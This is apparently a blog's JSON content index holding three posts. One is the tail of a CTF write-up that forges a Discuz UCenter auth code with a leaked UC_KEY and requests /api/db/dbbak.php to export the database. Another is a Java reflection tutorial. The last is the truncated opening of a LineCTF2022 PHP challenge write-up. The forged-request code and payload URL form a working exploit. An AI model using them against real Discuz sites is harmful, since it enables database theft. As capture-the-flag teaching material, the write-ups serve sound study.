chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));\t&#125;\tif($operation == &#x27;DECODE&#x27;) &#123;\t\tif(((int)substr($result, 0, 10) == 0 || (int)substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) === substr(md5(substr($result, 26).$keyb), 0, 16)) &#123;\t\t\treturn substr($result, 26);\t\t&#125; else &#123;\t\t\t\treturn &#x27;&#x27;;\t\t\t&#125;\t&#125; else &#123;\t\treturn $keyc.str_replace(&#x27;=&#x27;, &#x27;&#x27;, base64_encode($result));\t&#125;&#125;//这个函数可以根据operation参数进行加密和解密//然后有找到一个函数function encode_arr($get) &#123;\t$tmp = &#x27;&#x27;;\tforeach($get as $key =&gt; $val) &#123;\t\t$tmp .= &#x27;&amp;&#x27;.$key.&#x27;=&#x27;.$val;\t&#125;\treturn _authcode($tmp, &#x27;ENCODE&#x27;, UC_KEY);&#125;//这个函数实现了加密\n\n于是我们结合这两个方法进行加密即可，至于UC_KEY在\n\n\n找到了之后直接加密\n&lt;?phpdefine(&#x27;UC_KEY&#x27;, &#x27;N8ear1n0q4s646UeZeod130eLdlbqfs1BbRd447eq866gaUdmek7v2D9r9EeS6vb&#x27;);function _authcode($string, $operation = &#x27;DECODE&#x27;, $key = &#x27;&#x27;, $expiry = 0) &#123;        $ckey_length = 4;        $key = md5($key ? $key : UC_KEY);        $keya = md5(substr($key, 0, 16));        $keyb = md5(substr($key, 16, 16));        $keyc = $ckey_length ? ($operation == &#x27;DECODE&#x27; ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : &#x27;&#x27;;        $cryptkey = $keya.md5($keya.$keyc);        $key_length = strlen($cryptkey);        $string = $operation == &#x27;DECODE&#x27; ? base64_decode(substr($string, $ckey_length)) : sprintf(&#x27;%010d&#x27;, $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;        $string_length = strlen($string);        $result = &#x27;&#x27;;        $box = range(0, 255);        $rndkey = array();        for($i = 0; $i &lt;= 255; $i++) &#123;                $rndkey[$i] = ord($cryptkey[$i % $key_length]);        &#125;        for($j = $i = 0; $i &lt; 256; $i++) &#123;                $j = ($j + $box[$i] + $rndkey[$i]) % 256;                $tmp = $box[$i];                $box[$i] = $box[$j];                $box[$j] = $tmp;        &#125;        for($a = $j = $i = 0; $i &lt; $string_length; $i++) &#123;                $a = ($a + 1) % 256;                $j = ($j + $box[$a]) % 256;                $tmp = $box[$a];                $box[$a] = $box[$j];                $box[$j] = $tmp;                $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));        &#125;        if($operation == &#x27;DECODE&#x27;) &#123;                if(((int)substr($result, 0, 10) == 0 || (int)substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) === substr(md5(substr($result, 26).$keyb), 0, 16)) &#123;                        return substr($result, 26);                &#125; else &#123;                                return &#x27;&#x27;;                        &#125;        &#125; else &#123;                return $keyc.str_replace(&#x27;=&#x27;, &#x27;&#x27;, base64_encode($result));        &#125;&#125;function encode_arr($get) &#123;        $tmp = &#x27;&#x27;;        foreach($get as $key =&gt; $val) &#123;                $tmp .= &#x27;&amp;&#x27;.$key.&#x27;=&#x27;.$val;        &#125;        return _authcode($tmp, &#x27;ENCODE&#x27;, UC_KEY);&#125;$get = array(&#x27;time&#x27;=&gt;time(),&#x27;method&#x27;=&gt;&#x27;export&#x27;);$res = encode_arr($get);echo $res;\n\n然后在加密结果中会出现特殊字符，记得URL编码\npayload\n/api/db/dbbak.php?code=7b46hz%2FbDljJOuOeH6gwuQp4EV%2FRbC4kanxAZmaQENqgWwI1Ivsn7EB4kOmVXDVzuoEgVdH5XK4UPqU&amp;apptype=discuzx\n\n然后访问这个url下载sql文件\n\n\n全局搜索flag然后解密即可\n\n\n"},{"title":"Java反射","url":"/2025/10/31/Java%E5%8F%8D%E5%B0%84/","content":"Java反射反射是一种 在运行时动态获取类的信息，并操作类及其成员（方法、字段、构造器等）的机制。\n主要是在代码运行时不知道需要使用类的定义的情况下，通过类名、字符串等，反过来找类、创建对象、调用方法。\n正常情况下，我们需要调用一个对象的方法，我们需要先对对象进行实例化，然后调用方法\n// Main.javaimport com.itranswarp.learnjava.Person;public class Main &#123;    String getFullName(Person p) &#123;        return p.getFirstName() + &quot; &quot; + p.getLastName();    &#125;&#125;\n\n这样一旦将import语句去掉，我们就无法访问的Person类，会显示未定义。\n然后就是一些Java的机制，比如Spring 的依赖注入就是依靠反射进行类的寻找的\npublic class UserController &#123;    @Autowired    private UserService userService;&#125;//有类名，然后只要这个类在Spring中注册为Bean，就可以通过注册信息反射创建UserService\n\n\n\n还有一些类的创建方法被private修饰，被private修饰的修饰的方法只能在当前类被访问，即使类被import引入了也无法被实例化，最典型的就是Runtime，虽然Runtime可以直接调用静态方法getRuntime返回一个Runtime实例，但是其仍然不能通过new来创建实例，但是我们可以通过反射来创建Runtime实例，对于其他类也是适用的\nClass&lt;?&gt; clazz = Class.forName(&quot;java.lang.String&quot;);\n\n\n\n1.反射Class类除了int等基本类型外，Java的其他类型全部都是class（包括interface）。例如：\n\nString\nObject\nRunnable\nException\n…\n\n我们在学习反射加载类之前，我们需要了解一下JVM是如何加载类和对象的\n其实之前我就有一个疑惑，一开始我学Java的时候看见他们的代码想要调用一个类的方法都是先进行实例化，然后调用其方法。然后又告诉我可以直接Runtime.getRuntime，这是因为getRuntime是静态方法的，Java中会将所有静态加载到内存中，可以不需要实例化直接使用\n首先就是Java在加载一个类比如String的时候，JVM会加载String.class文件到内存中(其实感觉就是将String.calss复制过去使用)，然后会在我们的所有文件中进行import语句，于是就不需要import语句，先在方法区存放“类的结构信息”\n比如 String 这个类，它的：\n\n字段（如 private final byte[] value）\n方法（如 length(), charAt()）\n常量池信息\n父类、接口、修饰符等元数据\n\n这些类的定义信息被存放在 方法区（Metaspace）。 可以理解为：这是类的“蓝图”或“说明书”。\n然后就是在堆中实例化一个Class对象\nClass&lt;?&gt; c = String.class;  // 获取 Class 对象\n\n在堆里存在一个对象（Class 实例），它代表整个 String 类。\n这个对象的类型是 java.lang.Class\n然后就是加载完之后，我们每次实例化一个String类的时候，比如\nString s = &quot;hello&quot;; //注意只有在Java中有字面量比如String char int 这些才能直接实例化，其他都需要new 和c++是不同的String t = new String(&quot;world&quot;);\n\n这两个字符串都是指的是一个String对象，因为我们的堆中已经创建了一个String类型的实例Class，于是内存中就已经知道我们类的具体内容，可以直接将我们的对象在内存中以String对象的形式进行创建\n┌──────────────────────────────┐│  方法区（Metaspace）          ││──────────────────────────────││  String 类的元数据结构         ││    - 字段信息（value、hash）  ││    - 方法信息（length、charAt）││    - 常量池信息等              │└───────────────┬──────────────┘                │（引用指向）┌──────────────────────────────┐│  堆（Heap）                   ││──────────────────────────────││  Class&lt;String&gt; 对象（即 String.class） ││    ↳ 指向方法区的元数据        ││──────────────────────────────││  String 实例 s (&quot;hello&quot;)      ││    ↳ Class 指针 → 指向上面     ││──────────────────────────────││  String 实例 t (&quot;world&quot;)      ││    ↳ Class 指针 → 指向上面     │└──────────────────────────────┘\n\n意思就是在堆中先创建一个String类的Class对象，内存就知道我们的类的具体内容，然后就可以将String的实例存放至内存中。如果不提前创建Class对象的话内存中就是关于String什么都没有，当然也无法理解String对象是什么\n然后就是对于JVM在堆中创建的一个Class对象，这个Class类的构造方法是private，也就是这个只能由JVM自己创建，然后创建的每一个Class对象其实对应的是我们加载的每一个class文件\n所以，JVM持有的每个Class实例都指向一个数据类型（class或interface）：\n┌───────────────────────────┐│      Class Instance       │────▶ String├───────────────────────────┤│name = &quot;java.lang.String&quot;  │└───────────────────────────┘┌───────────────────────────┐│      Class Instance       │────▶ Random├───────────────────────────┤│name = &quot;java.util.Random&quot;  │└───────────────────────────┘┌───────────────────────────┐│      Class Instance       │────▶ Runnable├───────────────────────────┤│name = &quot;java.lang.Runnable&quot;│└───────────────────────────┘\n\n一个Class实例包含了该class的所有完整信息：\n┌───────────────────────────┐│      Class Instance       │────▶ String├───────────────────────────┤│name = &quot;java.lang.String&quot;  │├───────────────────────────┤│package = &quot;java.lang&quot;      │├───────────────────────────┤│super = &quot;java.lang.Object&quot; │├───────────────────────────┤│interface = CharSequence...│├───────────────────────────┤│field = value[],hash,...   │├───────────────────────────┤│method = indexOf()...      │└───────────────────────────┘\n\n由于JVM为每个加载的class创建了对应的Class实例，并在实例中保存了该class的所有信息，包括类名、包名、父类、实现的接口、所有方法、字段等，因此，如果获取了某个Class实例，我们就可以通过这个Class实例获取到该实例对应的class的所有信息。\n这种通过Class实例获取class信息的方法称为反射（Reflection）。\n如何获取一个class的Class实例？有三个方法：\n方法一：直接通过一个class的静态变量class获取：\nClass cls = String.class;//这个String.class就是JVM在堆中加载的Class对象\n\n方法二：如果我们有一个实例变量，可以通过该实例变量提供的getClass()方法获取：\nString s = &quot;Hello&quot;;Class cls = s.getClass();\n\n方法三：如果知道一个class的完整类名，可以通过静态方法Class.forName()获取：\nClass cls = Class.forName(&quot;java.lang.String&quot;);\n\n因为Class实例在JVM中是唯一的，所以，上述方法获取的Class实例是同一个实例。可以用==比较两个Class实例：\nClass cls1 = String.class;String s = &quot;Hello&quot;;Class cls2 = s.getClass();boolean sameClass = cls1 == cls2; // true\n\n注意一下Class实例比较和instanceof的差别：\nInteger n = new Integer(123);boolean b1 = n instanceof Integer; // true，因为n是Integer类型boolean b2 = n instanceof Number; // true，因为n是Number类型的子类//instanceof用于判断某个对象是否具有某个类或者其子类boolean b3 = n.getClass() == Integer.class; // true，因为n.getClass()返回Integer.classClass c1 = n.getClass();Class c2 = Number.class;boolean b4 = c1 == c2; // false，因为Integer.class != Number.class\n\n\n\n因为反射的目的是为了获得某个实例的信息。因此，当我们拿到某个Object实例时，我们可以通过反射获取该Object的class信息：\nvoid printObjectInfo(Object obj) &#123;    Class cls = obj.getClass();&#125;\n\n要从Class实例获取获取的基本信息，参考下面的代码：\n// reflectionpublic class Main &#123;    public static void main(String[] args) &#123;        printClassInfo(&quot;&quot;.getClass());        printClassInfo(Runnable.class);        printClassInfo(java.time.Month.class);        printClassInfo(String[].class);        printClassInfo(int.class);    &#125;    static void printClassInfo(Class cls) &#123;        System.out.println(&quot;Class name: &quot; + cls.getName());        System.out.println(&quot;Simple name: &quot; + cls.getSimpleName());        if (cls.getPackage() != null) &#123;            System.out.println(&quot;Package name: &quot; + cls.getPackage().getName());        &#125;        System.out.println(&quot;is interface: &quot; + cls.isInterface());        System.out.println(&quot;is enum: &quot; + cls.isEnum());        System.out.println(&quot;is array: &quot; + cls.isArray());        System.out.println(&quot;is primitive: &quot; + cls.isPrimitive());    &#125;&#125;\n\n注意到数组（例如String[]）也是一种类，而且不同于String.class，它的类名是java.lang.String;。此外，JVM为每一种基本类型如int也创建了Class实例，通过int.class访问。\n如果获取到了一个Class实例，我们就可以通过该Class实例来创建对应类型的实例：\n// 获取String的Class实例:Class cls = String.class;// 创建一个String实例:String s = (String) cls.newInstance();//我们也可以选择在创建的时候加入参数\n\n上述代码相当于new String()。通过Class.newInstance()可以创建类实例，它的局限是：只能调用public的无参数构造方法。带参数的构造方法，或者非public的构造方法都无法通过Class.newInstance()被调用。\n动态加载\nJVM在执行Java程序的时候，并不是一次性把所有用到的class全部加载到内存，而是第一次需要用到class时才加载。例如：\n// Main.javapublic class Main &#123;    public static void main(String[] args) &#123;        if (args.length &gt; 0) &#123;            create(args[0]);        &#125;    &#125;    static void create(String name) &#123;        Person p = new Person(name);    &#125;&#125;\n\n当执行Main.java时，由于用到了Main，因此，JVM首先会把Main.class加载到内存。然而，并不会加载Person.class，除非程序执行到create()方法，JVM发现需要加载Person类时，才会首次加载Person.class。如果没有执行create()方法，那么Person.class根本就不会被加载。\n这就是JVM动态加载class的特性。\n动态加载class的特性对于Java程序非常重要。利用JVM动态加载class的特性，我们才能在运行期根据条件加载不同的实现类。例如，Commons Logging总是优先使用Log4j，只有当Log4j不存在时，才使用JDK的logging。利用JVM动态加载特性，大致的实现代码如下：\n// Commons Logging优先使用Log4j:LogFactory factory = null;if (isClassPresent(&quot;org.apache.logging.log4j.Logger&quot;)) &#123;    factory = createLog4j();&#125; else &#123;    factory = createJdkLog();&#125;boolean isClassPresent(String name) &#123;    try &#123;        Class.forName(name);        return true;    &#125; catch (Exception e) &#123;        return false;    &#125;&#125;\n\n这就是为什么我们只需要把Log4j的jar包放到classpath中，Commons Logging就会自动使用Log4j的原因。\n2.访问字段我们先来认识一下什么是Java对象中的字段\n在Java中，字段（Field）指的是类或对象中定义的变量，用于表示对象的状态（数据）。\n换句话说：\n\n字段 &#x3D; 类的成员变量（member variable）\n\n然后一个字段作为Field对象包含了一个字段的所有信息，比如名字和值和类型和修饰符都可以通过字段对象访问到\n如何获取字段\n对任意的一个Object实例，只要我们获取了它的Class，就可以获取它的一切信息。\n我们先看看如何通过Class实例获取字段信息。Class类提供了以下几个方法来获取字段，也就是获取一个Field对象：\n\nField getField(name)：根据字段名获取某个public的field（包括父类）\nField getDeclaredField(name)：根据字段名获取当前类的某个field（不包括父类）\nField[] getFields()：获取所有public的field（包括父类）\nField[] getDeclaredFields()：获取当前类的所有field（不包括父类）\n\n我们来看下示例代码\n// reflectionpublic class Main &#123;    public static void main(String[] args) throws Exception &#123;        Class stdClass = Student.class;        // 获取public字段&quot;score&quot;:        System.out.println(stdClass.getField(&quot;score&quot;));        // 获取继承的public字段&quot;name&quot;:        System.out.println(stdClass.getField(&quot;name&quot;));        // 获取private字段&quot;grade&quot;:        System.out.println(stdClass.getDeclaredField(&quot;grade&quot;));    &#125;&#125;class Student extends Person &#123;    public int score;    private int grade;&#125;class Person &#123;    public String name;&#125;\n\n上述代码首先获取Student的Class实例，然后，分别获取public字段、继承的public字段以及private字段，打印出的Field类似：\npublic int Student.scorepublic java.lang.String Person.nameprivate int Student.grade\n\n\n\n一个Field对象包含了一个字段的所有信息：\n\ngetName()：返回字段名称，例如，&quot;name&quot;；\n\ngetType()：返回字段类型，也是一个Class实例，例如，String.class；\n\ngetModifiers()：返回字段的修饰符，它是一个int，不同的bit表示不同的含义。\n以String类的value字段为例，它的定义是：\n\n\npublic final class String &#123;    private final byte[] value;&#125;\n\n我们用反射获取该字段的信息，代码如下：\nField f = String.class.getDeclaredField(&quot;value&quot;);f.getName(); // &quot;value&quot;f.getType(); // class [B 表示byte[]类型int m = f.getModifiers();Modifier.isFinal(m); // trueModifier.isPublic(m); // falseModifier.isProtected(m); // falseModifier.isPrivate(m); // trueModifier.isStatic(m); // false\n\n\n\n获取字段值\n利用反射拿到字段的一个Field实例只是第一步，我们还可以拿到一个实例对应的该字段的值。\n例如，对于一个Person实例，我们可以先拿到name字段对应的Field，再获取这个实例的name字段的值：\n// reflectionimport java.lang.reflect.Field;public class Main &#123;    public static void main(String[] args) throws Exception &#123;        Object p = new Person(&quot;Xiao Ming&quot;);        Class c = p.getClass();        Field f = c.getDeclaredField(&quot;name&quot;);        Object value = f.get(p);        System.out.println(value); // &quot;Xiao Ming&quot;    &#125;&#125;class Person &#123;    private String name;    public Person(String name) &#123;        this.name = name;    &#125;&#125;\n\n上述代码先获取Class实例，再获取Field实例，然后，用Field.get(Object)获取指定实例的指定字段的值。\n运行代码，如果不出意外，会得到一个IllegalAccessException，这是因为name被定义为一个private字段，正常情况下，Main类无法访问Person类的private字段。要修复错误，可以将private改为public，或者，在调用Object value = f.get(p);前，先写一句：\nf.setAccessible(true);\n\n调用Field.setAccessible(true)的意思是，别管这个字段是不是public，一律允许访问。\n可以试着加上上述语句，再运行代码，就可以打印出private字段的值。\n有童鞋会问：如果使用反射可以获取private字段的值，那么类的封装还有什么意义？\n答案是正常情况下，我们总是通过p.name来访问Person的name字段，编译器会根据public、protected和private决定是否允许访问字段，这样就达到了数据封装的目的。\n而反射是一种非常规的用法，使用反射，首先代码非常繁琐，其次，它更多地是给工具或者底层框架来使用，目的是在不知道目标实例任何信息的情况下，获取特定字段的值。\n此外，setAccessible(true)可能会失败。如果JVM运行期存在SecurityManager，那么它会根据规则进行检查，有可能阻止setAccessible(true)。例如，某个SecurityManager可能不允许对java和javax开头的package的类调用setAccessible(true)，这样可以保证JVM核心库的安全。\n设置字段值\n通过Field实例既然可以获取到指定实例的字段值，自然也可以设置字段的值，获取值使用的是get方法，设置值自然使用的是set方法。\n设置字段值是通过Field.set(Object, Object)实现的，其中第一个Object参数是指定的实例，第二个Object参数是待修改的值。示例代码如下：\n// reflectionimport java.lang.reflect.Field;public class Main &#123;    public static void main(String[] args) throws Exception &#123;        Person p = new Person(&quot;Xiao Ming&quot;);        System.out.println(p.getName()); // &quot;Xiao Ming&quot;        Class c = p.getClass();        Field f = c.getDeclaredField(&quot;name&quot;);        f.setAccessible(true);        f.set(p, &quot;Xiao Hong&quot;);        System.out.println(p.getName()); // &quot;Xiao Hong&quot;    &#125;&#125;class Person &#123;    private String name;    public Person(String name) &#123;        this.name = name;    &#125;    public String getName() &#123;        return this.name;    &#125;&#125;\n\n运行上述代码，打印的name字段从Xiao Ming变成了Xiao Hong，说明通过反射可以直接修改字段的值。\n同样的，修改非public字段，需要首先调用setAccessible(true)。\n2.调用方法我们已经能通过Class实例获取所有Field对象，同样的，可以通过Class实例获取所有Method信息。Class类提供了以下几个方法来获取Method：\n\nMethod getMethod(name, Class...)：获取某个public的Method（包括父类）\nMethod getDeclaredMethod(name, Class...)：获取当前类的某个Method（不包括父类）\nMethod[] getMethods()：获取所有public的Method（包括父类）\nMethod[] getDeclaredMethods()：获取当前类的所有Method（不包括父类）\n\n这个和获取字段差不多，我们来看下示例代码\n// reflectionpublic class Main &#123;    public static void main(String[] args) throws Exception &#123;        Class stdClass = Student.class;        // 获取public方法getScore，参数为String:        System.out.println(stdClass.getMethod(&quot;getScore&quot;, String.class));        // 获取继承的public方法getName，无参数:        System.out.println(stdClass.getMethod(&quot;getName&quot;));        // 获取private方法getGrade，参数为int:        System.out.println(stdClass.getDeclaredMethod(&quot;getGrade&quot;, int.class));    &#125;&#125;class Student extends Person &#123;    public int getScore(String type) &#123;        return 99;    &#125;    private int getGrade(int year) &#123;        return 1;    &#125;&#125;class Person &#123;    public String getName() &#123;        return &quot;Person&quot;;    &#125;&#125;\n\n上述代码首先获取Student的Class实例，然后，分别获取public方法、继承的public方法以及private方法，打印出的Method类似：\npublic int Student.getScore(java.lang.String)public java.lang.String Person.getName()private int Student.getGrade(int)\n\n\n\n一个Method对象包含一个方法的所有信息：\n\ngetName()：返回方法名称，例如：&quot;getScore&quot;；\ngetReturnType()：返回方法返回值类型，也是一个Class实例，例如：String.class；\ngetParameterTypes()：返回方法的参数类型，是一个Class数组，例如：&#123;String.class, int.class&#125;；\ngetModifiers()：返回方法的修饰符，它是一个int，不同的bit表示不同的含义。\n\n调用实例方法\n当我们获取到一个Method对象时，就可以对它进行调用。我们以下面的代码为例：\nString s = &quot;Hello world&quot;;String r = s.substring(6); // &quot;world&quot;\n\n如果用反射来调用substring方法，需要以下代码：\n// reflectionimport java.lang.reflect.Method;//正常情况下没有Method这个类型，需要引用public class Main &#123;    public static void main(String[] args) throws Exception &#123;        // String对象:        String s = &quot;Hello world&quot;;        // 获取String substring(int)方法，参数为int:        Method m = String.class.getMethod(&quot;substring&quot;, int.class);        // 在s对象上调用该方法并获取结果:        String r = (String) m.invoke(s, 6);        // 打印调用结果:        System.out.println(r); // &quot;world&quot;    &#125;&#125;\n\n注意到substring()有两个重载方法，我们获取的是String substring(int)这个方法。思考一下如何获取String substring(int, int)方法。\n对Method实例调用invoke就相当于调用该方法，invoke的第一个参数是对象实例，即在哪个实例上调用该方法，后面的可变参数要与方法参数一致，否则将报错。\n面对要获取的方法有两个参数则是直接在后面加上另外一个参数即可\nimport java.lang.reflect.Method;public class Demo &#123;    public static void main(String[] args) throws Exception &#123;        Method m = String.class.getMethod(&quot;substring&quot;, int.class, int.class);        String s = &quot;hello&quot;;        String sub = (String) m.invoke(s, 1, 4); // 等价于 s.substring(1, 4)        System.out.println(sub); // &quot;ell&quot;    &#125;&#125;\n\n\n\n调用静态方法\n如果获取到的Method表示一个静态方法，调用静态方法时，由于无需指定实例对象，所以invoke方法传入的第一个参数永远为null。我们以Integer.parseInt(String)为例：\n// reflectionimport java.lang.reflect.Method;public class Main &#123;    public static void main(String[] args) throws Exception &#123;        // 获取Integer.parseInt(String)方法，参数为String:        Method m = Integer.class.getMethod(&quot;parseInt&quot;, String.class);        // 调用该静态方法并获取结果:        Integer n = (Integer) m.invoke(null, &quot;12345&quot;);        // 打印调用结果:        System.out.println(n);    &#125;&#125;\n\n这个原因就是静态方法其实会比其他实例方法都被提前加载，而且不能被重写。也就表明这个不是和某个实例对象绑定，而是和一开始加载的Class对象时就会加载静态方法，然后会和这个类绑定了，也就是调用静态方法的时候是在类本身中运行的，所以不需要在参数中写入对象\n调用非public方法\n和Field类似，对于非public方法，我们虽然可以通过Class.getDeclaredMethod()获取该方法实例，但直接对其调用将得到一个IllegalAccessException。为了调用非public方法，我们通过Method.setAccessible(true)允许其调用：\n// reflectionimport java.lang.reflect.Method;public class Main &#123;    public static void main(String[] args) throws Exception &#123;        Person p = new Person();        Method m = p.getClass().getDeclaredMethod(&quot;setName&quot;, String.class);        m.setAccessible(true);//和字段一样的操作        m.invoke(p, &quot;Bob&quot;);        System.out.println(p.name);    &#125;&#125;class Person &#123;    String name;    private void setName(String name) &#123;        this.name = name;    &#125;&#125;\n\n此外，setAccessible(true)可能会失败。如果JVM运行期存在SecurityManager，那么它会根据规则进行检查，有可能阻止setAccessible(true)。例如，某个SecurityManager可能不允许对java和javax开头的package的类调用setAccessible(true)，这样可以保证JVM核心库的安全。\n多态\n我们来考察这样一种情况：一个Person类定义了hello()方法，并且它的子类Student也覆写了hello()方法，那么，从Person.class获取的Method，作用于Student实例时，调用的方法到底是哪个？\n// reflectionimport java.lang.reflect.Method;public class Main &#123;    public static void main(String[] args) throws Exception &#123;        // 获取Person的hello方法:        Method h = Person.class.getMethod(&quot;hello&quot;);        // 对Student实例调用hello方法:        h.invoke(new Student());    &#125;&#125;class Person &#123;    public void hello() &#123;        System.out.println(&quot;Person:hello&quot;);    &#125;&#125;class Student extends Person &#123;    public void hello() &#123;        System.out.println(&quot;Student:hello&quot;);    &#125;&#125;\n\n运行上述代码，发现打印出的是Student:hello，因此，使用反射调用方法时，仍然遵循多态原则：即总是调用实际类型的覆写方法（如果存在）。上述的反射代码：\nMethod m = Person.class.getMethod(&quot;hello&quot;);m.invoke(new Student());\n\n实际上相当于：\nPerson p = new Student();p.hello();\n\n通过反射调用方法还是围绕着invoke这个特殊方法进行的\n3.调用构造方法我们通常使用new操作符创建新的实例：\nPerson p = new Person();\n\n如果通过反射来创建新的实例，可以调用Class提供的newInstance()方法：\nPerson p = Person.class.newInstance();\n\n调用Class.newInstance()的局限是，它只能调用该类的public无参数构造方法。如果构造方法带有参数，或者不是public，就无法直接通过Class.newInstance()来调用。\n为了调用任意的构造方法，Java的反射API提供了Constructor对象，它包含一个构造方法的所有信息，可以创建一个实例。Constructor对象和Method非常类似，不同之处仅在于它是一个构造方法，并且，调用结果总是返回实例：\nimport java.lang.reflect.Constructor;public class Main &#123;    public static void main(String[] args) throws Exception &#123;        // 获取构造方法Integer(int):        Constructor cons1 = Integer.class.getConstructor(int.class);        // 调用构造方法:        Integer n1 = (Integer) cons1.newInstance(123);        System.out.println(n1);        // 获取构造方法Integer(String)        Constructor cons2 = Integer.class.getConstructor(String.class);        Integer n2 = (Integer) cons2.newInstance(&quot;456&quot;);        System.out.println(n2);    &#125;&#125;\n\n通过Class实例获取Constructor的方法如下：\n\ngetConstructor(Class...)：获取某个public的Constructor；\ngetDeclaredConstructor(Class...)：获取某个Constructor；\ngetConstructors()：获取所有public的Constructor；\ngetDeclaredConstructors()：获取所有Constructor。\n\n注意Constructor总是当前类定义的构造方法，和父类无关，因此不存在多态的问题。那也就是说getDeclaredConstructor不就吊打getConstructor了吗\n调用非public的Constructor时，必须首先通过setAccessible(true)设置允许访问。setAccessible(true)可能会失败。\n4.获取继承关系获取父类\n有了Class实例，我们还可以获取它的父类的Class：\n// reflectionpublic class Main &#123;    public static void main(String[] args) throws Exception &#123;        Class i = Integer.class;        Class n = i.getSuperclass();        System.out.println(n);        Class o = n.getSuperclass();        System.out.println(o);        System.out.println(o.getSuperclass());    &#125;&#125;\n\n运行上述代码，可以看到，Integer的父类类型是Number，Number的父类是Object，Object的父类是null。除Object外，其他任何非interface的Class都必定存在一个父类类型。\nclass java.lang.Numberclass java.lang.Objectnull\n\n\n\n获取interface\n由于一个类可能实现一个或多个接口，通过Class我们就可以查询到实现的接口类型。例如，查询Integer实现的接口：\n// reflectionimport java.lang.reflect.Method;public class Main &#123;    public static void main(String[] args) throws Exception &#123;        Class s = Integer.class;        Class[] is = s.getInterfaces();        for (Class i : is) &#123;            System.out.println(i);        &#125;    &#125;&#125;\n\n由于JDK版本的不同，这些类有时候实现的接口也不同\n运行上述代码可知，Integer实现的接口有：\n\njava.lang.Comparable\njava.lang.constant.Constable\njava.lang.constant.ConstantDesc\n\n要特别注意：getInterfaces()只返回当前类直接实现的接口类型，并不包括其父类实现的接口类型：\n// reflectionimport java.lang.reflect.Method;public class Main &#123;    public static void main(String[] args) throws Exception &#123;        Class s = Integer.class.getSuperclass();//所以我们要先获取到父类        Class[] is = s.getInterfaces();        for (Class i : is) &#123;            System.out.println(i);        &#125;    &#125;&#125;\n\nInteger的父类是Number，Number实现的接口是java.io.Serializable。\n此外，对所有interface的Class调用getSuperclass()返回的是null，获取接口的父接口要用getInterfaces()：\nSystem.out.println(java.io.DataInputStream.class.getSuperclass()); // java.io.FilterInputStream，因为DataInputStream继承自FilterInputStreamSystem.out.println(java.io.Closeable.class.getSuperclass()); // null，对接口调用getSuperclass()总是返回null，获取接口的父接口要用getInterfaces()\n\n如果一个类没有实现任何interface，那么getInterfaces()返回空数组。\n继承关系\n当我们判断一个实例是否是某个类型时，正常情况下，使用instanceof操作符：\nObject n = Integer.valueOf(123);boolean isDouble = n instanceof Double; // falseboolean isInteger = n instanceof Integer; // trueboolean isNumber = n instanceof Number; // trueboolean isSerializable = n instanceof java.io.Serializable; // true\n\n如果是两个Class实例，要判断一个向上转型是否成立，可以调用isAssignableFrom()：\n// Integer i = ?Integer.class.isAssignableFrom(Integer.class); // true，因为Integer可以赋值给Integer// Number n = ?Number.class.isAssignableFrom(Integer.class); // true，因为Integer可以赋值给Number// Object o = ?Object.class.isAssignableFrom(Integer.class); // true，因为Integer可以赋值给Object// Integer i = ?Integer.class.isAssignableFrom(Number.class); // false，因为Number不能赋值给Integer\n\n\n\n5.动态代理我们知道，想要调用Java中接口的方法就需要通过实现类来调用，有没有可能不编写实现类，直接在运行期创建某个interface的实例呢？\n这是可能的，因为Java标准库提供了一种动态代理（Dynamic Proxy）的机制：可以在运行期动态创建某个interface的实例。\n我们先来看下正常代码是如何写的\npublic interface Hello &#123;    void morning(String name);&#125;public class HelloWorld implements Hello &#123;    public void morning(String name) &#123;        System.out.println(&quot;Good morning, &quot; + name);    &#125;&#125;Hello hello = new HelloWorld();hello.morning(&quot;Bob&quot;);//这也算是某种意义上的通过接口调用方法了\n\n还有一种方式是动态代码，我们仍然先定义了接口Hello，但是我们并不去编写实现类，而是直接通过JDK提供的一个Proxy.newProxyInstance()创建了一个Hello接口对象。这种没有实现类但是在运行期动态创建了一个接口对象的方式，我们称为动态代码。JDK提供的动态创建接口对象的方式，就叫动态代理。\nimport java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;public class Main &#123;    public static void main(String[] args) &#123;        InvocationHandler handler = new InvocationHandler() &#123;            @Override            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;                System.out.println(method);                if (method.getName().equals(&quot;morning&quot;)) &#123;                    System.out.println(&quot;Good morning, &quot; + args[0]);                &#125;                return null;            &#125;        &#125;;        Hello hello = (Hello) Proxy.newProxyInstance(            Hello.class.getClassLoader(), // 传入ClassLoader            new Class[] &#123; Hello.class &#125;, // 传入要实现的接口            handler); // 传入处理调用方法的InvocationHandler        hello.morning(&quot;Bob&quot;);    &#125;&#125;interface Hello &#123;    void morning(String name);&#125;\n\n我们之前就注意到，想通过一个类（也就是反射出来的类）进行方法调用，直接是不行的，需要通过Method方法然后调用invoke方法，通过提供类和方法参数作为参数进行方法调用\n于是我们这个动态代理也就是通过重写invoke方法来决定我们通过Proxy.newProxyInstance动态实现的接口中方法的具体实现\n在运行期动态创建一个interface实例的方法如下：\n\n定义一个InvocationHandler实例，它负责实现接口的方法调用；\n\n通过\n Proxy.newProxyInstance()\n\n 创建\n interface\n\n 实例，它需要3个参数：\n\n使用的ClassLoader，通常就是接口类的ClassLoader；\n需要实现的接口数组，至少需要传入一个接口进去；\n用来处理接口方法调用的InvocationHandler实例。\n\n\n将返回的Object强制转型为接口。\n\n\n动态代理实际上是JVM在运行期动态创建class字节码并加载的过程，它并没有什么黑魔法，把上面的动态代理改写为静态实现类大概长这样：\npublic class HelloDynamicProxy implements Hello &#123;    InvocationHandler handler;    public HelloDynamicProxy(InvocationHandler handler) &#123;        this.handler = handler;    &#125;    public void morning(String name) &#123;        handler.invoke(           this,           Hello.class.getMethod(&quot;morning&quot;, String.class),           new Object[] &#123; name &#125;        );    &#125;&#125;\n\n\n\n","tags":["Java反射"]},{"title":"[LineCTF2022]BB","url":"/2025/07/08/LineCTF2022-BB/","content":"[LineCTF2022]BB &lt;?php    error_reporting(0);    function bye($s, $ptn)&#123;        if(preg_match($ptn, $s))&#123;            return false;        &#125;        return true;    &#125;    foreach($_GET[&quot;env&quot;] as $k=&gt;$v)&#123;        if(bye($k, &quot;/=/i&quot;) 